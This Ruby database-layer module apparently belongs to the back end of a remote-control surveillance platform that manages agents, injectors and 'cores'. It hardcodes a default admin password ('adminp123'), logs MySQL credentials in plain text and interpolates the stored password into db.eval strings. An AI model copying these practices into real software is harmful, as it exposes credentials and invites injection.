#
# Layer for accessing the real DB
#

require_relative 'audit.rb'
require_relative 'config'

# from RCS::Common
require 'rcs-common/trace'

# system
require 'mysql2' unless RUBY_PLATFORM =~ /java/
require 'mongo'
require 'mongoid'
require 'rbconfig'

# require all the DB objects
Dir[File.dirname(__FILE__) + '/db_objects/*.rb'].each do |file|
  require file
end

module RCS
module DB

class DB
  include Singleton
  include RCS::Tracer

  def initialize
    @available = false
    @semaphore = Mutex.new
    @auth_required = false
    @auth_user = 'root'
    @auth_pass = File.binread(Config.instance.file('mongodb.key')) if File.exist?(Config.instance.file('mongodb.key'))
  end

unless RUBY_PLATFORM =~ /java/
  def mysql_connect(user, pass, host)
    begin
      @mysql = Mysql2::Client.new(:host => host, :username => user, :password => pass, :database => 'rcs')
      trace :info, "Connected to MySQL [#{user}:#{pass}]"
      @available = true
    rescue Exception => e
      trace :fatal, "Cannot connect to MySQL: #{e.message}"
      @available = false
      raise
    end
  end
  
  def mysql_query(query, opts={:symbolize_keys => true})
    begin
      @semaphore.synchronize do
        # execute the query
        @mysql.query(query, opts)
      end
    rescue Mysql2::Error => e
      trace :error, "#{e.message}. Retrying ..."
      sleep 0.05
      retry
    rescue Exception => e
      trace :error, "MYSQL ERROR [#{e.sql_state}][#{e.error_number}]: #{e.message}"
      trace :error, "MYSQL QUERY: #{query}"
      @available = false if e.error_number == 2006
      raise
    end
  end
  
  def mysql_escape(*strings)
    strings.each do |s|
      s.replace @mysql.escape(s) if s.class == String
    end
  end
end

  # MONGO
  
  def connect
    begin
      # this is required for mongoid >= 2.4.2
      ENV['MONGOID_ENV'] = 'yes'

      Mongoid.load!(Dir.pwd + '/config/mongoid.yaml')
      Mongoid.configure do |config|
        config.master = Mongo::Connection.new(Config.instance.global['CN'], 27017, pool_size: 50, pool_timeout: 15).db('rcs')
      end
      trace :info, "Connected to MongoDB"

      # check if we need to authenticate
      begin
        Mongoid.database.authenticate(@auth_user, @auth_pass)
        trace :info, "Authenticated to MongoDB"
        @auth_required = true
      rescue Exception => e
        trace :warn, "AUTH: #{e.message}"
      end

    rescue Exception => e
      trace :fatal, e
      return false
    end
    return true
  end

  def new_connection(db, host = Config.instance.global['CN'], port = 27017)
    time = Time.now
    db = Mongo::Connection.new(host, port).db(db)
    db.authenticate(@auth_user, @auth_pass) if @auth_required
    delta = Time.now - time
    trace :warn, "Opening new connection is too slow (%f), check name resolution" % delta if delta > 0.5
    return db
  rescue Mongo::AuthenticationError => e
    trace :fatal, "AUTH: #{e.message}"
  end

  def ensure_mongo_auth
    # don't create the users if already there
    #return if @auth_required

    # ensure the users are created on master
    ['rcs', 'admin', 'config'].each do |name|
      trace :debug, "Setting up auth for: #{name}"
      db = new_connection(name)
      db.eval("db.addUser('#{@auth_user}', '#{@auth_pass}')")
    end

    # ensure the users are created on each shard
    shards = Shard.all
    shards['shards'].each do |shard|
      trace :debug, "Setting up auth for: #{shard['host']}"
      host, port = shard['host'].split(':')
      db = new_connection('rcs', host, port.to_i)
      db.eval("db.addUser('#{@auth_user}', '#{@auth_pass}')")
    end
  end

  # insert here the class to be indexed
  @@classes_to_be_indexed = [::Audit, ::User, ::Group, ::Alert, ::Core, ::Collector, ::Injector, ::Item]

  def create_indexes
    db = DB.instance.new_connection("rcs")

    @@classes_to_be_indexed.each do |k|
      # get the metadata of the collection
      coll = db.collection(k.collection_name)
      # skip if already indexed
      begin
        next if coll.stats['nindexes'] > 1
      rescue Mongo::OperationFailure
      end
      # create the index
      trace :info, "Creating indexes for #{k.collection_name}"
      k.create_indexes
    end
  end

  def enable_sharding
    if Shard.count == 0
      output = Shard.create(Config.instance.global['CN'])
      trace :info, "Adding the first Shard: #{output}"
      raise "Cannot create shard" unless output['ok'] == 1
    end
    output = Shard.enable('rcs')
    trace :info, "Enable Sharding on 'rcs': #{output}"
  end

  def shard_audit
    # enable shard on audit log, it will increase its size forever and ever
    db = Mongoid.database
    audit = db.collection('audit')
    Shard.set_key(audit, {time: 1, actor: 1}) unless audit.stats['sharded']
  end

  def ensure_admin
    # check that at least one admin is present and enabled
    # if it does not exists, create it
    if User.count(conditions: {enabled: true, privs: 'ADMIN'}) == 0
      trace :warn, "No ADMIN found, creating a default admin user..."
      User.where(name: 'admin').delete_all
      user = User.create(name: 'admin') do |u|
        u[:pass] = u.create_password('adminp123')
        u[:enabled] = true
        u[:desc] = 'Default admin user'
        u[:privs] = ['ADMIN', 'SYS', 'TECH', 'VIEW']
        u[:locale] = 'en_US'
        u[:timezone] = 0
      end
      Audit.log :actor => '<system>', :action => 'user.create', :user_name => 'admin', :desc => "Created the default user 'admin'"

      group = Group.create(name: "administrators", alert: false)
      group.users << user
      group.save
      Audit.log :actor => '<system>', :action => 'group.create', :group_name => 'administrators', :desc => "Created the default group 'administrators'"
    end
  end

  def ensure_signatures
    if Signature.count == 0
      trace :warn, "No Signature found, creating them..."
      Signature.create(scope: 'agent') { |s| s.value = SecureRandom.hex(16) }
      Signature.create(scope: 'collector') { |s| s.value = SecureRandom.hex(16) }
      Signature.create(scope: 'network') { |s| s.value = SecureRandom.hex(16) }
      Signature.create(scope: 'server') { |s| s.value = SecureRandom.hex(16) }
    end
    # dump the signature for NIA, Anon etc to a file
    File.open(Config.instance.cert('rcs-network.sig'), 'wb') {|f| f.write Signature.where(scope: 'network').first.value}
  end

  def ensure_cn_resolution
    return unless RbConfig::CONFIG['host_os'] =~ /mingw/

    # make sure the CN is resolved properly in IPv4
    content = File.open("C:\\windows\\system32\\drivers\\etc\\hosts", 'rb') {|f| f.read}

    entry = "\n127.0.0.1\t#{Config.instance.global['CN']}"

    unless content[entry]
      trace :info, "Adding CN (#{Config.instance.global['CN']}) to /etc/hosts file"
      content += entry
      File.open("C:\\windows\\system32\\drivers\\etc\\hosts", 'wb') {|f| f.write content}
    end
  end

  def load_cores
    trace :info, "Loading cores into db..."
    Dir['./cores/*'].each do |core_file|
      name = File.basename(core_file, '.zip')
      version = ''
      begin
        Zip::ZipFile.open(core_file) do |z|
          version = z.file.open('version', "rb") { |f| f.read }.chomp
        end

        trace :debug, "Load core: #{name} #{version}"

        # search if already present
        core = ::Core.where({name: name}).first
        core.destroy unless core.nil?

        # replace the new one
        core = ::Core.new
        core.name = name
        core.version = version

        core[:_grid] = [ GridFS.put(File.open(core_file, 'rb+') {|f| f.read}, {filename: name}) ]
        core[:_grid_size] = File.size(core_file)
        core.save
      rescue Exception => e
        trace :error, "Cannot load core #{name}: #{e.message}"
      end
      File.delete(core_file)
    end
  end

end

end #DB::
end #RCS::
